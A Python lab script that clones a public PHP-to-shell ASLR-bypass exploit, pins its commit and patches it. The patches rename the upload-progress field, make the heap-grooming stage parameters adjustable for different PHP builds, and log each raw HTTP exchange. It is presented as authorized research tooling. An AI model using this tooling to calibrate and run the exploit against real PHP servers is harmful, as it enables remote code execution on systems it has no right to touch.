#!/usr/bin/env python3
"""Pin and prepare the public ASLR research exploit for the local lab."""

from __future__ import annotations

import subprocess
import sys
from pathlib import Path

from request_display_patch import patch_request_display


UPSTREAM_URL = "https://github.com/9bie/php2shell-bypass-aslr-exp.git"
EXPECTED_COMMIT = "4586f5cc120c82fd468b17469202bac629810ad9"
UPLOAD_PROGRESS_NAME = "progress_meter_challenge_id"


def run(command: list[str], *, cwd: Path | None = None) -> None:
    subprocess.run(command, cwd=cwd, check=True)


def current_commit(repo: Path) -> str | None:
    try:
        result = subprocess.run(
            ["git", "rev-parse", "HEAD"],
            cwd=repo,
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
        )
    except (OSError, subprocess.CalledProcessError):
        return None
    return result.stdout.strip()


def prepare(repo: Path) -> None:
    if not (repo / ".git").exists():
        repo.parent.mkdir(parents=True, exist_ok=True)
        run(["git", "clone", UPSTREAM_URL, str(repo)])

    if current_commit(repo) != EXPECTED_COMMIT:
        run(["git", "fetch", "origin", EXPECTED_COMMIT], cwd=repo)
        run(["git", "checkout", "--detach", EXPECTED_COMMIT], cwd=repo)

    if current_commit(repo) != EXPECTED_COMMIT:
        raise RuntimeError(f"unexpected upstream commit: {current_commit(repo)}")

    patch_upload_progress_name(repo)
    patch_stage_profile_controls(repo)
    patch_request_dump(repo)
    patch_request_display(repo)


def patch_upload_progress_name(repo: Path) -> None:
    """Adapt the pinned primitive to this lab's neutral progress-field name."""
    path = repo / "exploit.py"
    source = path.read_text(encoding="utf-8")
    marker = f"__P2S_PROGRESS_NAME_{UPLOAD_PROGRESS_NAME.upper()}__"
    if marker in source:
        return

    old = '"PHP_SESSION_UPLOAD_PROGRESS"'
    new = f'"{UPLOAD_PROGRESS_NAME}"'
    if old in source:
        source = source.replace(old, new)
    elif f'"{UPLOAD_PROGRESS_NAME}"' not in source:
        raise RuntimeError("upstream upload-progress field pattern not found")
    source = source.replace(
        '#!/usr/bin/env python3\n"""\n',
        f'#!/usr/bin/env python3\n"""\n{marker}\n',
        1,
    )
    path.write_text(source, encoding="utf-8")


def patch_stage_profile_controls(repo: Path) -> None:
    """Let the wrapper inject a complete calibrated profile at runtime.

    The upstream primitive hard-codes the successful PHP 8.4.26 request shape.
    Additional verified builds can share the chain but need different heap
    parameters. Environment injection keeps the pinned checkout recognisable
    while making stage geometry data-driven from the JSON profiles.
    """
    path = repo / "exploit.py"
    source = path.read_text(encoding="utf-8")
    forge_old = '        forge = bytearray(b"A" * 79)\n'
    forge_new = '        forge = bytearray(b"A" * self.stage1_forge_len)\n'
    block_old = '''        self.stage3_carrier = False

    # ---------- request primitives (shapes match tools/*.py) ----------'''
    block_new = '''        self.stage3_carrier = False

        # Research-profile overrides. Defaults preserve upstream behaviour.
        self.stage1_n = int(os.environ.get("P2S_STAGE1_N", self.stage1_n))
        self.stage1_forge_len = int(
            os.environ.get("P2S_STAGE1_FORGE_LEN", getattr(self, "stage1_forge_len", 79))
        )
        self.stage2_t = int(os.environ.get("P2S_STAGE2_T", self.stage2_t))
        self.stage2_v = int(os.environ.get("P2S_STAGE2_V", self.stage2_v))
        style = os.environ.get("P2S_STAGE3_STYLE")
        if style == "bookworm":
            self.stage3_pads = [(31, 31)] * 6
            self.stage3_carrier = True
        elif style == "lab":
            self.stage3_pads = [(8, 7)] + [(7, 7)] * 5
            self.stage3_carrier = False

    # ---------- request primitives (shapes match tools/*.py) ----------'''

    if "P2S_STAGE2_T" in source and forge_new in source:
        return
    if block_old not in source:
        raise RuntimeError("upstream heap-profile calibration patterns not found")
    source = source.replace(forge_old, forge_new, 1)
    source = source.replace(block_old, block_new, 1)
    path.write_text(source, encoding="utf-8")



def patch_request_dump(repo: Path) -> None:
    '''Instrument the pinned Target adapter to archive exact wire exchanges.

    Dumping is disabled unless P2S_REQUEST_DUMP_DIR is set. When enabled, each
    request is written as a gzip-compressed byte-for-byte HTTP/1.1 stream plus
    JSON metadata, a SHA-256, and the observed response. Compression avoids
    storing repeated multi-megabyte fields uncompressed.
    '''
    path = repo / "exploit.py"
    source = path.read_text(encoding="utf-8")

    if "P2S_REQUEST_DUMP_DIR" not in source:
        source = source.replace(
            "import argparse\n",
            "import argparse\nimport gzip\nimport hashlib\nimport json\n",
            1,
        )
        source = source.replace(
            '''        self.timeout = timeout
        self.verbose = verbose
''',
            '''        self.timeout = timeout
        self.verbose = verbose
        self.dump_dir = os.environ.get("P2S_REQUEST_DUMP_DIR")
        self.dump_sequence = 0
''',
            1,
        )

        helper = r'''    def _dump_exchange(self, method: str, headers: bytes, body: bytes,
                       response: bytes) -> None:
        """Write one exact request/response exchange for authorized research."""
        if not self.dump_dir:
            return
        os.makedirs(self.dump_dir, exist_ok=True)
        self.dump_sequence += 1
        prefix = f"{self.dump_sequence:06d}"
        request = headers + body
        request_path = os.path.join(self.dump_dir, prefix + ".request.gz")
        response_path = os.path.join(self.dump_dir, prefix + ".response.gz")
        meta_path = os.path.join(self.dump_dir, prefix + ".json")
        with open(request_path, "wb") as fh:
            fh.write(gzip.compress(request, compresslevel=6, mtime=0))
        with open(response_path, "wb") as fh:
            fh.write(gzip.compress(response, compresslevel=6, mtime=0))
        request_line = headers.split(b"\r\n", 1)[0].decode("ascii", "replace")
        metadata = {
            "sequence": self.dump_sequence,
            "method": method,
            "request_line": request_line,
            "path": request_line.split(" ", 2)[1] if " " in request_line else self.path,
            "target": f"{self.host}:{self.port}",
            "request_file": prefix + ".request.gz",
            "response_file": prefix + ".response.gz",
            "request_size": len(request),
            "header_size": len(headers),
            "body_size": len(body),
            "response_size": len(response),
            "request_sha256": hashlib.sha256(request).hexdigest(),
            "body_sha256": hashlib.sha256(body).hexdigest(),
            "response_sha256": hashlib.sha256(response).hexdigest(),
        }
        with open(meta_path, "w", encoding="utf-8") as fh:
            json.dump(metadata, fh, indent=2)
            fh.write("\n")

'''
        source = source.replace("    def post(self, body: bytes,", helper + "    def post(self, body: bytes,", 1)
        source = source.replace(
            '''            reader.join(timeout=(timeout or self.timeout) + 1.0)
            return bytes(data)
''',
            '''            reader.join(timeout=(timeout or self.timeout) + 1.0)
            result = bytes(data)
            self._dump_exchange("POST", hdr, body, result)
            return result
''',
            1,
        )
        source = source.replace(
            '''        m = re.match(rb"HTTP/1\\.[01] (\\d{3})", head)
        return (int(m.group(1)) if m else 0), body
''',
            '''        m = re.match(rb"HTTP/1\\.[01] (\\d{3})", head)
        self._dump_exchange("GET", hdr, b"", bytes(data))
        return (int(m.group(1)) if m else 0), body
''',
            1,
        )
        path.write_text(source, encoding="utf-8")

def main() -> int:
    repo = Path(__file__).resolve().parent / "vendor" / "php2shell-upstream"
    prepare(repo)
    print(f"PHP2Shell upstream pinned at {EXPECTED_COMMIT}")
    print(f"Path: {repo}")
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        raise SystemExit(130)
